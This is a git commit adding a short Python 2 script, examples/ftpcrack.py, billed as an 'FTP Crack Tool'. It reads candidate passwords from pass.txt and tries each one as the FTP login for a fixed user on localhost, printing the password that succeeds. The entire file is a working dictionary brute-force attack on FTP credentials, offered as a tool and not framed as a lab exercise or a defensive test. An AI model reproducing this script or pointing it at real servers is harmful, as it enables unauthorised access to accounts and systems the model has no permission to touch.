26285adce218042c234880e381ff8f4688721d1e
BesimAltnok <besimaltnok@gmail.com>
2016-02-28 13:37:00 +0200

    Create ftpcrack.py

---
+++ examples/ftpcrack.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python
+
+import sys, os
+import ftplib
+from termcolor import colored
+from colorama import Fore, Back, Style
+
+
+def ftp_brute(p):
+	try:
+		print "Pass trying for FTP :  ", p
+		host = 'localhost'
+		user = "besim"
+		ftp = ftplib.FTP(host, timeout=0.08)
+		ftp.login(user, p)
+		print colored("Password Found ! :) = > " + str(p), 'green')
+		ftp.quit()
+		sys.exit(0)
+		
+	except Exception, e:
+		sys.stdout.flush()
+
+if __name__ == "__main__":
+	os.system('reset')
+	print(Back.GREEN + '\t\t\tFTP Crack Tool\t\t\t\t\t\n')
+	print(Style.RESET_ALL)
+	passfile = open("pass.txt", "r").readlines()
+	map(ftp_brute, passfile)
+	print Back.WHITE + Fore.RED + "The password could not be determined :-("
+	print Back.WHITE + Fore.RED + "Try ", len(passfile), " password for cracking :/"
